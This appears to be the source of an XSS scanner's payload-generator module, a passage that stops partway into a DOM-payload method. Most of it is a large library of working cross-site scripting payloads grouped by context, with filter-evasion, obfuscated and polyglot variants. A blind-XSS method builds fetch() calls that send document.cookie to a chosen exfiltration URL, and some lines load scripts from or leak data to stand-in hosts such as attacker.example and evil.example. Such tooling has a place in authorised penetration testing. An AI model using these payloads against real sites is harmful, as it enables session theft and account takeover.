"""
Advanced payload generation module with comprehensive XSS payload library.
"""

import random
import re
import string
from typing import Dict, List, Optional, Sequence, Set, Tuple
from dataclasses import dataclass
from enum import Enum


class PayloadContext(Enum):
    """Payload execution contexts."""
    HTML = "html"
    ATTR_DOUBLE = "attr_double"
    ATTR_SINGLE = "attr_single"
    ATTR_UNQUOTED = "attr_unquoted"
    JAVASCRIPT = "javascript"
    CSS = "css"
    URL = "url"
    SVG = "svg"
    TEMPLATE = "template"


@dataclass
class Payload:
    """XSS payload with metadata."""
    template: str
    context: PayloadContext
    marker: str
    description: str
    tamper_resistant: bool = False
    obfuscated: bool = False


class PayloadGenerator:
    """
    Comprehensive XSS payload generator.
    Generates context-aware payloads with various evasion techniques.

    Payload budget reality: the full corpus (LazyXss + SecLists) contains ~7,000
    payloads, but only `max_payloads` (default 6) are tested per injection point.
    The ranking prioritizes context-specific vectors over generic ones.
    """

    # ================================================================
    # Basic HTML payloads
    # ================================================================
    HTML_PAYLOADS = [
        # --- Original ---
        "<script>{marker}</script>",
        "<img src=x onerror={marker}>",
        "<svg/onload={marker}>",
        "<body onload={marker}>",
        "<iframe srcdoc=\"<script>{marker}</script>\">",
        "<details open ontoggle={marker}>",
        "<marquee onstart={marker}>",
        "<input autofocus onfocus={marker}>",
        "<select onfocus={marker} autofocus>",
        "<textarea onfocus={marker} autofocus>",
        "<keygen onfocus={marker} autofocus>",
        "<video><source onerror={marker}>",
        "<audio src=x onerror={marker}>",
        "<audio src=x oncanplay={marker}>",
        "<video><track default oncuechange={marker}>",
        "<form><button formaction=javascript:{marker}>",
        "<svg><animate onbegin={marker}>",

        # --- Modern event-handler variants ---
        "<dialog open onclose={marker}>",
        "<dialog open ontoggle={marker}>",
        "<details ontoggle={marker}>",
        "<marquee onfinish={marker}>",
        "<marquee onbounce={marker}>",
        "<video src=x onerror={marker}>",
        "<video poster=x onerror={marker}>",
        "<video><source src=x onerror={marker}>",
        "<audio><source src=x onerror={marker}>",
        "<img src=x onanimationstart={marker}>",
        "<img src=x ontransitionend={marker}>",
        "<img src=x onpointerover={marker}>",
        "<img src=x onpointerenter={marker}>",
        "<img src=x onload={marker}>",
        "<img src=x onerror={marker} src=1>",                       # attribute-order defeat
        "<input autofocus onfocus={marker} type=submit>",
        "<input autofocus onfocusin={marker}>",
        "<body onpageshow={marker}>",
        "<body onhashchange={marker}>",

        # --- Less-common tags with active content ---
        "<object data=javascript:{marker}>",
        "<embed src=javascript:{marker}>",
        "<link rel=stylesheet href=\"data:text/css,{marker}\">",
        "<meta http-equiv=refresh content=\"0;url=javascript:{marker}\">",
        "<base href=javascript:{marker}//>",
        "<a href=javascript:{marker}>click</a>",
        "<a href=\"javascript:{marker}\">click</a>",
        "<form action=javascript:{marker}><input type=submit></form>",
        "<form><input type=submit formaction=javascript:{marker}></form>",
        "<button formaction=javascript:{marker} form=f>click</button><form id=f></form>",
        "<iframe src=javascript:{marker}></iframe>",
        "<iframe src=\"data:text/html,<script>{marker}</script>\"></iframe>",
        "<table background=javascript:{marker}>",                    # IE legacy
        "<isindex action=javascript:{marker} type=image>",           # legacy, parsed as form
        "<frameset onload={marker}>",
        "<frame src=javascript:{marker}>",

        # --- mXSS / mutation vectors (execute after sanitize → re-parse) ---
        "<noscript><p title=\"</noscript><script>{marker}</script>\">",
        "<template><script>{marker}</script></template>",
        "<template><img src=x onerror={marker}></template>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror={marker}>",
        "<svg><foreignObject><script>{marker}</script></foreignObject></svg>",

        # --- Declarative shadow DOM (Chrome 90+) ---
        "<div><template shadowrootmode=open><script>{marker}</script></template></div>",
        "<div><template shadowrootmode=open><img src=x onerror={marker}></template></div>",

        # --- SVG variants (cross-reference with SVG_PAYLOADS) ---
        "<svg onload={marker}></svg>",
        "<svg><set attributeName=onload to={marker}>",
        "<svg><animateMotion onbegin={marker} dur=1s>",
        "<svg><discard onbegin={marker}>",
        "<svg><a><text x=20 y=20>{marker}</text></a></svg>",

        # --- Modern / exotic vectors -----------------------------------------
        # MathML href executes javascript: URIs in several engines.
        "<math href=\"javascript:{marker}\"><mi>x</mi></math>",
        # SVG animation retargeting: mutate an href to javascript: post-parse.
        "<svg><a><rect width=100 height=100><animate attributeName=\"xlink:href\" values=\"javascript:{marker}\" /><text x=10 y=20>click</text></a></svg>",
        "<svg><a><rect width=100 height=100><set attributeName=\"xlink:href\" to=\"javascript:{marker}\" /><text x=10 y=20>click</text></a></svg>",
        # SVG listener/handler elements (SVG Tiny 1.2, still parsed).
        "<svg><listener event=load handler=\"{marker}\"/>",
        "<svg><handler type=application/ecmascript ev:event=load>{marker}</handler></svg>",
        # iframe srcdoc with sandbox still executes when allow-scripts present.
        "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>{marker}</script>\"></iframe>",
        "<iframe sandbox=\"allow-scripts allow-same-origin\" srcdoc=\"<img src=x onerror={marker}>\"></iframe>",
        # Object/embed with data: HTML documents.
        "<object data=\"data:text/html,<script>{marker}</script>\"></object>",
        "<embed src=\"data:text/html,<script>{marker}</script>\">",
        # Portal / fencedframe speculative vectors.
        "<portal src=\"javascript:{marker}\"></portal>",
        "<fencedframe srcdoc=\"<script>{marker}</script>\"></fencedframe>",
        # input type=image formaction javascript.
        "<input type=image src=x formaction=\"javascript:{marker}\">",
        "<isindex type=image src=x action=\"javascript:{marker}\">",
        # Raw-text element breakouts (parser context escapes).
        "</xmp><script>{marker}</script>",
        "</textarea><script>{marker}</script>",
        "</title><script>{marker}</script>",
        "</style><script>{marker}</script>",
        "</noscript><script>{marker}</script>",
        "<svg><![CDATA[</svg><script>{marker}</script>]]>",
        # annotation-xml encoding switch (mXSS classic).
        "<math><annotation-xml encoding=\"text/html\"><script>{marker}</script></annotation-xml></math>",
        "<svg><annotation-xml encoding=\"text/html\"><script>{marker}</script></annotation-xml></svg>",
        # select/option + autofocus.
        "<select autofocus onfocus={marker}><option>x</option></select>",
        # video/audio event-handler variants.
        "<video oncanplay={marker} src=x></video>",
        "<video onplay={marker} src=x></video>",
        "<video onpause={marker} src=x></video>",
        "<video onended={marker} src=x></video>",
        "<audio oncanplaythrough={marker} src=x></audio>",
        "<audio ondurationchange={marker} src=x></audio>",
        "<audio onloadeddata={marker} src=x></audio>",
        # img srcset onerror.
        "<img srcset=\"x 1x\" onerror={marker}>",
        "<img srcset=\"x 1x, y 2x\" onerror={marker}>",
        # picture/source srcset.
        "<picture><source srcset=\"x\" onerror={marker}></picture>",
        # svg image href javascript:.
        "<svg><image href=\"javascript:{marker}\"/></svg>",
        "<svg><image xlink:href=\"javascript:{marker}\"/></svg>",
        # svg script element.
        "<svg><script>{marker}</script></svg>",
        # svg foreignObject + body onload.
        "<svg><foreignObject><body onload={marker}></body></foreignObject></svg>",
        # math + mtext + style.
        "<math><mtext><style><img src=x onerror={marker}></style></mtext></math>",
        # table cell background javascript: (legacy but parsed).
        "<td background=\"javascript:{marker}\">x</td>",
        "<th background=\"javascript:{marker}\">x</th>",
        # input type=image src javascript:.
        "<input type=image src=\"javascript:{marker}\">",
        # button formaction with data: URL.
        "<button formaction=\"data:text/html,<script>{marker}</script>\">x</button>",
        # a ping + javascript href.
        "<a href=\"javascript:{marker}\" ping=//x>click</a>",
        # form action data: URL.
        "<form action=\"data:text/html,<script>{marker}</script>\"><input type=submit></form>",
        # iframe srcdoc variants (single-level, realistic).
        "<iframe srcdoc=\"<body onload={marker}>\"></iframe>",
        "<iframe srcdoc=\"<svg onload={marker}></svg>\"></iframe>",
        "<iframe srcdoc=\"<img src=x onerror={marker}>\"></iframe>",
        "<iframe srcdoc=\"<details open ontoggle={marker}></details>\"></iframe>",
        "<iframe srcdoc=\"<marquee onstart={marker}></marquee>\"></iframe>",
        "<iframe srcdoc=\"<input autofocus onfocus={marker}>\"></iframe>",
        "<iframe srcdoc=\"<video src=x onerror={marker}></video>\"></iframe>",
        "<iframe srcdoc=\"<audio src=x onerror={marker}></audio>\"></iframe>",
        "<iframe srcdoc=\"<object data=javascript:{marker}></object>\"></iframe>",
        "<iframe srcdoc=\"<embed src=javascript:{marker}>\"></iframe>",
        "<iframe srcdoc=\"<meta http-equiv=refresh content='0;url=javascript:{marker}'>\"></iframe>",
        "<iframe srcdoc=\"<base href=javascript:{marker}//>\"></iframe>",
        "<iframe srcdoc=\"</xmp><script>{marker}</script>\"></iframe>",
        "<iframe srcdoc=\"</textarea><script>{marker}</script>\"></iframe>",
        "<iframe srcdoc=\"</title><script>{marker}</script>\"></iframe>",
        "<iframe srcdoc=\"</style><script>{marker}</script>\"></iframe>",
        "<iframe srcdoc=\"</noscript><script>{marker}</script>\"></iframe>",
        "<iframe srcdoc=\"<svg><![CDATA[</svg><script>{marker}</script>]]>\"></iframe>",
        "<iframe srcdoc=\"<svg><foreignObject><iframe srcdoc='<script>{marker}</script>'></iframe></foreignObject></svg>\"></iframe>",
        "<iframe srcdoc=\"<div><template shadowrootmode=open><script>{marker}</script></template></div>\"></iframe>",
        "<iframe srcdoc=\"<math><annotation-xml encoding='text/html'><script>{marker}</script></annotation-xml></math>\"></iframe>",
        "<iframe srcdoc=\"<select autofocus onfocus={marker}><option>x</option></select>\"></iframe>",
        "<iframe srcdoc=\"<video poster=x onerror={marker}></video>\"></iframe>",
        "<iframe srcdoc=\"<audio oncanplaythrough={marker} src=x></audio>\"></iframe>",
        "<iframe srcdoc=\"<img srcset='x 1x' onerror={marker}>\"></iframe>",
        "<iframe srcdoc=\"<picture><source srcset='x' onerror={marker}></picture>\"></iframe>",
        "<iframe srcdoc=\"<svg><image href=javascript:{marker}/></svg>\"></iframe>",
        "<iframe srcdoc=\"<svg><script>{marker}</script></svg>\"></iframe>",
        "<iframe srcdoc=\"<svg><foreignObject><body onload={marker}></body></foreignObject></svg>\"></iframe>",
        "<iframe srcdoc=\"<math><mtext><style><img src=x onerror={marker}></style></mtext></math>\"></iframe>",
        "<iframe srcdoc=\"<table background=javascript:{marker}><tr><td>x</td></tr></table>\"></iframe>",
        "<iframe srcdoc=\"<th background=javascript:{marker}>x</th>\"></iframe>",
        "<iframe srcdoc=\"<input type=image src=javascript:{marker}>\"></iframe>",
        "<iframe srcdoc=\"<button formaction='data:text/html,<script>{marker}</script>'>x</button>\"></iframe>",
        "<iframe srcdoc=\"<a href=javascript:{marker} ping=//x>click</a>\"></iframe>",
        "<iframe srcdoc=\"<area ping=//x href=javascript:{marker}>\"></iframe>",
        "<iframe srcdoc=\"<form action='data:text/html,<script>{marker}</script>'><input type=submit></form>\"></iframe>",
        # form/input event-handler variants.
        "<form onsubmit={marker}><input></form>",
        "<form onreset={marker}><input></form>",
        "<form oninvalid={marker}><input required></form>",
        "<textarea oninput={marker}>x</textarea>",
        "<textarea onchange={marker}>x</textarea>",
        "<input oninput={marker}>",
        "<input onchange={marker}>",
        "<select onchange={marker}><option>x</option></select>",
        # legacy elements still parsed by some engines.
        "<layer src=\"javascript:{marker}\"></layer>",
        "<ilayer src=\"javascript:{marker}\"></ilayer>",
        "<bgsound src=\"javascript:{marker}\">",
        "<body background=\"javascript:{marker}\">",
        "<xml id=xss src=\"data:application/xml,<script>{marker}</script>\"></xml>",
        "<applet archive=\"javascript:{marker}\"></applet>",
        "<object classid=\"clsid:00000000-0000-0000-0000-000000000000\" codebase=\"javascript:{marker}\"></object>",
        "<embed pluginspage=\"javascript:{marker}\">",
        "<iframe longdesc=\"javascript:{marker}\"></iframe>",
        "<frame longdesc=\"javascript:{marker}\">",
        "<frameset longdesc=\"javascript:{marker}\"></frameset>",
        "<map name=x><area href=\"javascript:{marker}\" shape=rect coords=\"0,0,1,1\"></map><img src=x usemap=#x>",
    ]

    # ================================================================
    # Attribute payloads — double-quoted context
    # ================================================================
    ATTR_DOUBLE_PAYLOADS = [
        # --- Original ---
        "\" onerror={marker} \"",
        "\" onmouseover={marker} \"",
        "\" autofocus onfocus={marker} \"",
        "\"><script>{marker}</script>",
        "\" x=\"y\" onerror={marker} \"",

        # --- Event handler injection ---
        "\" onload={marker} x=\"",
        "\" onfocus={marker} autofocus x=\"",
        "\" onanimationstart={marker} style=animation-name:x x=\"",
        "\" ontoggle={marker} \"",
        "\" onbeforetoggle={marker} \"",
        "\" onpointerover={marker} \"",
        "\" onfocusin={marker} autofocus \"",
        "\" onmouseenter={marker} \"",
        "\" onclick={marker} \"",
        "\" onauxclick={marker} \"",
        "\" onwheel={marker} \"",

        # --- Attribute chaining / breaking out ---
        "\" style=\"x\" onerror={marker} \"",
        "\" src=x onerror={marker} \"",
        "\" href=javascript:{marker} \"",
        "\" action=javascript:{marker} \"",
        "\" formaction=javascript:{marker} \"",
        "\" data=x onclick={marker} \"",

        # --- Tag breakouts ---
        "\"><img src=x onerror={marker}>",
        "\"><svg onload={marker}>",
        "\"><iframe srcdoc=\"<script>{marker}</script>\">",
        "\"><details open ontoggle={marker}>",

        # --- Encoded quote variants ---
        "\" onerror=&#x61;lert({marker}) \"",                       # partial entity (used by WAF bypass)
        "\" onerror=alert&#x28;1&#x29; x=\"{marker}\"",             # marker in inert position
    ]

    # ================================================================
    # Attribute payloads — single-quoted context
    # ================================================================
    ATTR_SINGLE_PAYLOADS = [
        # --- Original ---
        "' onerror={marker} '",
        "' onmouseover={marker} '",
        "' autofocus onfocus={marker} '",
        "'><script>{marker}</script>",
        "' x='y' onerror={marker} '",

        # --- Event handler injection ---
        "' onload={marker} x='",
        "' onfocus={marker} autofocus x='",
        "' ontoggle={marker} '",
        "' onbeforetoggle={marker} '",
        "' onpointerover={marker} '",
        "' onfocusin={marker} autofocus '",
        "' onmouseenter={marker} '",
        "' onclick={marker} '",
        "' onauxclick={marker} '",

        # --- Attribute chaining ---
        "' style='x' onerror={marker} '",
        "' src=x onerror={marker} '",
        "' href=javascript:{marker} '",
        "' action=javascript:{marker} '",
        "' formaction=javascript:{marker} '",

        # --- Tag breakouts ---
        "'><img src=x onerror={marker}>",
        "'><svg onload={marker}>",
        "'><iframe srcdoc='<script>{marker}</script>'>",
        "'><details open ontoggle={marker}>",
    ]

    # ================================================================
    # Attribute payloads — unquoted context
    # ================================================================
    ATTR_UNQUOTED_PAYLOADS = [
        # --- Original ---
        " onerror={marker} ",
        " onmouseover={marker} ",
        " autofocus onfocus={marker} ",
        "><script>{marker}</script>",
        " x=y onerror={marker} ",

        # --- Event handler injection (space-delimited, unquoted attributes
        #     terminate at whitespace or `>`) ---
        " onfocus={marker} autofocus ",
        " ontoggle={marker} ",
        " onbeforetoggle={marker} ",
        " onpointerover={marker} ",
        " onfocusin={marker} autofocus ",
        " onmouseenter={marker} ",
        " onclick={marker} ",
        " onauxclick={marker} ",
        " onanimationstart={marker} ",

        # --- Attribute chaining ---
        " src=x onerror={marker} ",
        " href=javascript:{marker} ",
        " action=javascript:{marker} ",
        " formaction=javascript:{marker} ",

        # --- Tag breakouts ---
        "><img src=x onerror={marker}>",
        "><svg onload={marker}>",
        "><details open ontoggle={marker}>",
        "><iframe srcdoc=\"<script>{marker}</script>\">",
    ]

    # ================================================================
    # JavaScript payloads
    # ================================================================
    JS_PAYLOADS = [
        # --- Original ---
        ";{marker}//",
        ");{marker}//",
        "}};{marker}//",
        "{marker}()",
        "window['{marker}']",
        "this['{marker}']",
        "eval('{marker}')",
        "Function('{marker}')()",
        "setTimeout('{marker}')",
        "setInterval('{marker}')",
        ";{marker}`1`//",
        ";location='javascript:'+{marker}//",
        ";throw onerror={marker},1//",

        # --- String-context breakouts ---
        "\\';{marker}//",                                          # escaped single quote
        "\\\";{marker}//",                                         # escaped double quote
        "*/{marker}/*",                                            # block-comment breakout
        "`;{marker}//",                                            # backtick (template literal)

        # --- Template literal injection ---
        "${ {marker} }",
        "`+{marker}+`",
        "`${`${`${ {marker} }`}`}`",

        # --- Indirect call / constructor reach ---
        "constructor.constructor('{marker}')()",
        "({}).constructor.constructor('{marker}')()",
        "this.constructor.constructor('{marker}')()",
        "[].filter.constructor('{marker}')()",

        # --- Dynamic import / module loading ---
        "import('{marker}')",
        "importScripts('{marker}')",

        # --- Backtick-only execution (no parentheses) ---
        "{marker}`1`",

        # --- Call with harmless expression (fires when parsed) ---
        "void {marker}",
        "typeof {marker}",
        "!{marker}",

        # --- Async/await contexts ---
        "await {marker}",
        ";(async()=>{marker})()",

        # --- Wrapped in try/catch (survives surrounding scope) ---
        ";try{{marker}}catch(e){}//",
    ]

    # ================================================================
    # CSS payloads
    # ================================================================
    CSS_PAYLOADS = [
        # --- Original ---
        ";expression({marker})",
        "};{marker};{",
        "x:expression({marker})",
        "background:url('javascript:{marker}')",

        # --- Modern @import ---
        "@import 'javascript:{marker}';",
        "@import url('javascript:{marker}');",
        "@import url(\"data:text/css,{marker}\");",
        "@import 'data:text/css;base64,{marker}';",

        # --- url() sinks ---
        "background:url(javascript:{marker})",                     # unquoted
        "background:url(\"javascript:{marker}\")",
        "background-image:url('data:text/css,{marker}')",
        "list-style-image:url('javascript:{marker}')",
        "cursor:url('javascript:{marker}')",
        "content:url('data:text/html,{marker}')",

        # --- Legacy IE / behaviour sinks ---
        "behavior:url({marker}.htc)",
        "-ms-behavior:url({marker}.htc)",
        "-moz-binding:url('data:text/xml,{marker}')",
        "filter:progid:DXImageTransform.Microsoft.{marker}",

        # --- CSS exfiltration (marker leaks via font/URL) ---
        "@font-face{font-family:x;src:url('https://evil.example/?c={marker}')}",
        "body{background:url('https://evil.example/?c={marker}')}",
        "x{font-family:'{marker}'}",

        # --- CSS escapes (break out of keyword filters) ---
        "\\65 xpression({marker})",                                # \65 = 'e'
        "\\000065 xpression({marker})",
        "e\\78pression({marker})",                                 # \78 = 'x'

        # --- Tag-breakout (ends `<style>` block) ---
        "</style><script>{marker}</script>",
        "</style><img src=x onerror={marker}>",
    ]

    # ================================================================
    # URL payloads
    # ================================================================
    URL_PAYLOADS = [
        # --- Original ---
        "javascript:{marker}",
        "data:text/html,<script>{marker}</script>",

        # --- javascript: whitespace / control-character bypasses ---
        "java\tscript:{marker}",                                   # tab
        "java\nscript:{marker}",                                   # newline
        "java\rscript:{marker}",                                   # carriage return
        "\u000Bjavascript:{marker}",                               # vertical tab (CVE-2020-…)
        "\u000Cjavascript:{marker}",                               # form feed
        "\u0000javascript:{marker}",                               # null byte
        " javascript:{marker}",                                    # leading space
        "javascript\u0001:{marker}",                               # control char

        # --- HTML-entity obfuscation ---
        "&#x6A;avascript:{marker}",
        "javascript&colon;{marker}",
        "&#106;avascript&#58;{marker}",

        # --- Comment / protocol tricks ---
        "javascript:/*{marker}*/",
        "javascript://%0A{marker}",
        "javascript://attacker.example/%0A{marker}",

        # --- data: URI variants ---
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",     # base64 of <script>alert(1)</script>
        "data:text/javascript,{marker}",
        "data:application/javascript,{marker}",
        "data:application/x-javascript,{marker}",
        "data:text/html,<script>{marker}</script>",
        "data:text/html;charset=utf-8,<script>{marker}</script>",

        # --- Blob / filesystem URLs (must be constructed at runtime) ---
        "blob:https://attacker.example/{marker}",
        "filesystem:https://attacker.example/temporary/{marker}.js",

        # --- Legacy / browser-specific ---
        "vbscript:msgbox({marker})",
        "livescript:{marker}",
        "mocha:{marker}",
    ]

    # ================================================================
    # SVG payloads
    # ================================================================
    SVG_PAYLOADS = [
        # --- Original ---
        "<svg onload={marker}>",
        "<svg><script>{marker}</script></svg>",
        "<svg><animate attributeName=href values=javascript:{marker}>",

        # --- Script loading ---
        "<svg><script href=\"data:text/javascript,{marker}\"/></svg>",
        "<svg><script xlink:href=\"javascript:{marker}\"/></svg>",
        "<svg><script xlink:href=\"data:text/javascript,{marker}\"/></svg>",

        # --- Event-driven ---
        "<svg><animate onbegin={marker}>",
        "<svg><set attributeName=onload to={marker}>",
        "<svg><animateMotion onbegin={marker} dur=1s>",
        "<svg><animateTransform onbegin={marker}>",
        "<svg><handler onbegin={marker}>",                         # rare but supported
        "<svg><discard onbegin={marker}>",
        "<svg><use href=\"data:image/svg+xml,<svg onload={marker}>\">",
        "<svg><image href=\"javascript:{marker}\">",
        "<svg><a xlink:href=\"javascript:{marker}\"><text>click</text></a></svg>",

        # --- Namespace breakout / mXSS ---
        "<svg><foreignObject><script>{marker}</script></foreignObject></svg>",
        "<svg><foreignObject><img src=x onerror={marker}></foreignObject></svg>",
        "<svg><title><style><img src=x onerror={marker}></style></title></svg>",
        "<svg><desc><style><img src=x onerror={marker}></style></desc></svg>",

        # --- CDATA breakout ---
        "<svg><![CDATA[><img src=x onerror={marker}>]]></svg>",
    ]

    # ================================================================
    # Polyglot payloads (work in multiple contexts)
    # ================================================================
    POLYGLOT_PAYLOADS = [
        # --- Original ---
        "<script>/*<sCRIPT%20src=x%20onerror={marker}>*/</script>",
        "<script>/*<script>{marker}</script>*/</script>",
        "\"'><script>{marker}</script>",
        "<img src=x onerror={marker}>\"'><script>{marker}</script>",
        "javascript:/*'<script>{marker}</script>*/",

        # --- Jackmasa-style (HTML + attribute + JS) ---
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={marker} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={marker}//>\\x3e",

        # --- HTML + attribute polyglot ---
        "\"><img src=x onerror={marker}>\".<script>{marker}</script>",
        "'><img src=x onerror={marker}>'.<script>{marker}</script>",
        "\"><svg/onload={marker}>\"'><script>{marker}</script>",

        # --- JS string + comment polyglot ---
        "';{marker}//",
        "\\';{marker}//",
        "`;{marker}//",

        # --- URL + HTML polyglot ---
        "javascript:{marker}<!--",
        "javascript://%0A{marker}-->",

        # --- Multi-breakout (quotes + angle brackets) ---
        "\"'><svg/onload={marker}>\",'",
        "';alert({marker})//';alert({marker})//",
    ]

    # ================================================================
    # Obfuscated payloads
    # ================================================================
    OBFUSCATED_PAYLOADS = [
        # --- Original ---
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>alert&#40;1&#41;</script>",
        "<script>alert(String.fromCharCode(49))</script>",
        "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",
        "<script>alert(1)//\n</script>",

        # --- JavaScript char/unicode escapes ---
        "<script>\\u0061lert({marker})</script>",
        "<script>\\x61lert({marker})</script>",
        "<script>[].filter.constructor('{marker}')()</script>",
        "<script>top['al'+'ert']({marker})</script>",
        "<script>window['al'+'ert']({marker})</script>",

        # --- String.fromCharCode / atob / Base64 ---
        "<script>eval(atob('YWxlcnQoMSk='))</script>",             # atob('alert(1)')
        "<script>[].constructor.constructor('{marker}')()</script>",
        "<img src=x onerror=eval(atob('{marker}'))>",

        # --- Template literal / backtick variants ---
        "<script>alert`{marker}`</script>",
        "<script>eval`\\u0061lert({marker})`</script>",

        # --- HTML entity / numeric reference ---
        "&#x3C;script&#x3E;{marker}&#x3C;/script&#x3E;",
        "&lt;script&gt;{marker}&lt;/script&gt;",                   # reflection-only, useful for context check

        # --- Comment injection (break keyword signatures) ---
        "<script>e/**/v/**/a/**/l({marker})</script>",
        "<script>eval/**/(/**/atob('{marker}')/**/)</script>",
        "<scri/**/pt>{marker}</scri/**/pt>",

        # --- JSFuck-lite (bracket/constructor chain) ---
        "<script>[][(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([]+{})[+!+[]]+(!![]+[])[+[]]]+[])[+[]]+([]+{})[+!+[]]</script>",

        # --- Whitespace-obfuscated tag names ---
        "<\tscript\t>{marker}</\tscript\t>",
        "<\nscript\n>{marker}</\nscript\n>",
        "<script\x0B>{marker}</script>",                           # vertical tab inside tag
    ]

    # ================================================================
    # Filter evasion payloads
    # ================================================================
    EVASION_PAYLOADS = [
        # --- Original ---
        "<script>{marker}</script>",
        "<script >{marker}</script>",
        "<script\n>{marker}</script>",
        "<script/**/{marker}</script>",
        "<script/* */{marker}</script>",
        "<sCrIpT>{marker}</sCrIpT>",
        "<script%20{marker}</script>",

        # --- Case / mixed-case variants ---
        "<ScRiPt>{marker}</sCrIpT>",
        "<SCRIPT>{marker}</SCRIPT>",
        "<sCrIpT>{marker}</script>",

        # --- Whitespace / control-char injection inside tag ---
        "<script\t>{marker}</script>",
        "<script\r>{marker}</script>",
        "<script\f>{marker}</script>",                             # form feed
        "<script\x00>{marker}</script>",                           # null byte
        "<script\x0B>{marker}</script>",                           # vertical tab
        "<script\v>{marker}</script>",
        "<script\x20\x20>{marker}</script>",

        # --- Comment injection inside tag (breaks `<script>` signature) ---
        "<scr<!-- -->ipt>{marker}</scr<!-- -->ipt>",
        "<scr<script>ipt>{marker}</scr</script>ipt>",              # nested script tag split
        "<script /**/>{marker}</script>",
        "<script/**/type/**/=/**/text/javascript>{marker}</script>",

        # --- Attribute injection inside the script tag itself ---
        "<script src=//attacker.example/x.js>{marker}</script>",
        "<script src=//attacker.example/x.js defer>{marker}</script>",
        "<script for=document event=onclick>{marker}</script>",     # legacy IE
        "<script language=vbscript>{marker}</script>",              # legacy IE

        # --- Tag-splitting / URL-encoded variants ---
        "%3Cscript%3E{marker}%3C/script%3E",
        "%3Cscript%3E{marker}%3C%2Fscript%3E",
        "%253Cscript%253E{marker}%253C/script%253E",                # double-encoded

        # --- Alternative tag names (case-varied / trailing space) ---
        "<SCRIPT SRC=//attacker.example/x.js>",
        "<img/src=x/onerror={marker}>",
        "<img src=x/onerror={marker}>",
        "<img src=\"x\" onerror={marker}>",
        "<svg/onload={marker}/>",
        "<svg/onload={marker}//>",

        # --- Attribute-name-less / value confusion ---
        "<img src=x onerror={marker} onerror=1>",                  # duplicate attribute (last wins)
        "<img src=x onerror onerror={marker}>",
        "<img src=x onerror=\"x\" onerror={marker}>",

        # --- Tag-name obfuscation with tab inside the name ---
        "<img\tsrc\t=\tx\tonerror\t=\t{marker}>",
        "<img\nsrc\n=\nx\nonerror\n=\n{marker}>",

        # --- Bare URL-encoded quotes for context breaking ---
        "%22%3E%3Cscript%3E{marker}%3C/script%3E",
        "%27%3E%3Cscript%3E{marker}%3C/script%3E",
    ]

    def __init__(self):
        self._context_map = {
            PayloadContext.HTML: self.HTML_PAYLOADS,
            PayloadContext.ATTR_DOUBLE: self.ATTR_DOUBLE_PAYLOADS,
            PayloadContext.ATTR_SINGLE: self.ATTR_SINGLE_PAYLOADS,
            PayloadContext.ATTR_UNQUOTED: self.ATTR_UNQUOTED_PAYLOADS,
            PayloadContext.JAVASCRIPT: self.JS_PAYLOADS,
            PayloadContext.CSS: self.CSS_PAYLOADS,
            PayloadContext.URL: self.URL_PAYLOADS,
            PayloadContext.SVG: self.SVG_PAYLOADS,
        }

    def generate_payloads(
        self,
        context: PayloadContext,
        marker: str,
        count: int = 10,
        include_polyglots: bool = False,
        include_obfuscated: bool = False,
        include_evasion: bool = False
    ) -> List[Payload]:
        """
        Generate XSS payloads for a specific context.

        Args:
            context: Target execution context
            marker: Unique marker for verification
            count: Number of payloads to generate
            include_polyglots: Include polyglot payloads
            include_obfuscated: Include obfuscated payloads
            include_evasion: Include filter evasion payloads

        Returns:
            List of Payload objects
        """
        payloads = []

        # Get context-specific payloads
        templates = self._context_map.get(context, self.HTML_PAYLOADS)

        # Generate standard payloads
        for template in templates[:count]:
            payloads.append(Payload(
                template=template,
                context=context,
                marker=marker,
                description=f"Standard {context.value} payload"
            ))

        # Add polyglot payloads if requested
        if include_polyglots:
            for template in self.POLYGLOT_PAYLOADS[:3]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Polyglot payload",
                    tamper_resistant=True
                ))

        # Add obfuscated payloads if requested
        if include_obfuscated:
            for template in self.OBFUSCATED_PAYLOADS[:2]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Obfuscated payload",
                    obfuscated=True
                ))

        # Add evasion payloads if requested
        if include_evasion:
            for template in self.EVASION_PAYLOADS[:3]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Filter evasion payload",
                    tamper_resistant=True
                ))

        # Optional payload families are additive: truncating to ``count`` after
        # appending them silently dropped every polyglot/obfuscated/evasion
        # vector whenever the context already had ``count`` standard templates.
        if include_polyglots or include_obfuscated or include_evasion:
            return payloads
        return payloads[:count]

    def generate_custom_payload(
        self,
        template: str,
        marker: str,
        context: PayloadContext = PayloadContext.HTML
    ) -> Payload:
        """Generate a custom payload from a template."""
        return Payload(
            template=template,
            context=context,
            marker=marker,
            description="Custom payload"
        )

    def generate_blind_payload(
        self,
        exfil_url: str,
        marker: str,
        context: PayloadContext = PayloadContext.HTML
    ) -> Payload:
        """Generate a blind XSS payload for exfiltration."""
        if context == PayloadContext.HTML:
            template = f"<script>fetch('{exfil_url}?m={marker}&c='+document.cookie)</script>"
        elif context == PayloadContext.ATTR_DOUBLE:
            template = f'" onerror="fetch(\'{exfil_url}?m={marker}&c=\'+document.cookie)"'
        elif context == PayloadContext.ATTR_SINGLE:
            template = f"' onerror='fetch(\'{exfil_url}?m={marker}&c=\'+document.cookie)'"
        elif context == PayloadContext.JAVASCRIPT:
            template = f"fetch('{exfil_url}?m={marker}&c='+document.cookie)"
        else:
            template = f"<script>fetch('{exfil_url}?m={marker}&c='+document.cookie)</script>"
        
        return Payload(
            template=template,
            context=context,
            marker=marker,
            description="Blind XSS exfiltration payload"
        )

    def generate_dom_payload(
        self,
        source: str,
        marker: str
    ) -> Payload:
